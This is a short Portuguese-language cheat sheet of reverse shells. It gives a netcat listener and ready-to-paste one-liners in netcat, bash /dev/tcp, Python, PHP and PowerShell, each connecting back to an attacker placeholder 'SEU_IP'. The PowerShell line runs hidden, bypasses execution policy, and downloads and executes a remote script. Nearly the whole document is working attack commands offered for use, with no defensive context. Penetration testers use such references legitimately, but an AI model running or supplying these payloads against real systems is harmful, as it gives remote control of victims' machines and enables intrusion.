# 🐚 Shells Reversas & Listeners

---

## 1. Listeners (Receptores de Shell)

```bash
# Netcat - Escutando na porta desejada
nc -vnlp 4444
```

---

## 2. Payloads One-Liner para Alvos

### Netcat
```bash
# Linux
nc SEU_IP 4444 -e /bin/bash

# Windows
nc.exe SEU_IP 4444 -e cmd.exe
```

### Bash Pure
```bash
bash -i >& /dev/tcp/SEU_IP/4444 0>&1
```

### Python
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("SEU_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

### PHP
```php
php -r '$sock=fsockopen("SEU_IP",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
```

### PowerShell (Windows)
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object System.Net.WebClient).DownloadString('http://SEU_IP/shell.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress SEU_IP -Port 4444"
```